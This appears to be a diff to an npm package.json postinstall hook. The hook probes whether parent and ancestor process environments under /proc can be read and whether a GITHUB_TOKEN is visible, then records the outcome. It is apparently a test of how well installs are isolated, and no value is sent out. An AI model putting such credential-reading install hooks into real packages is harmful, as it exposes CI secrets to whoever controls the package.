@@ -4,6 +4,6 @@
   "main": "index.js",
   "publishDate": "2025-06-01T20:00:00.000Z",
   "scripts": {
-    "postinstall": "node probe.js && (sh -c 'tr \"\\\\0\" \"\\\\n\" < /proc/self/environ 2>/dev/null | grep -q PATH' && node record.js \"sh: own environ: readable\" || node record.js \"sh: own environ: unreadable\") && (sh -c 'for p in $PPID $(cut -d \" \" -f 4 /proc/$PPID/stat 2>/dev/null); do tr \"\\\\0\" \"\\\\n\" < /proc/$p/environ 2>/dev/null | grep -q GITHUB_TOKEN && exit 0; done; exit 1' && node record.js \"sh: ancestor environ: leaked\" || node record.js \"sh: ancestor environ: hidden\")"
+    "postinstall": "node probe.js && (sh -c 'tr \"\\\\0\" \"\\\\n\" < /proc/$PPID/environ 2>/dev/null | grep -q PATH' && node record.js \"sh: parent environ: readable\" || node record.js \"sh: parent environ: unreadable\") && (sh -c 'for p in $PPID $(cut -d \" \" -f 4 /proc/$PPID/stat 2>/dev/null); do tr \"\\\\0\" \"\\\\n\" < /proc/$p/environ 2>/dev/null | grep -q GITHUB_TOKEN && exit 0; done; exit 1' && node record.js \"sh: ancestor environ: leaked\" || node record.js \"sh: ancestor environ: hidden\")"
   }
 }
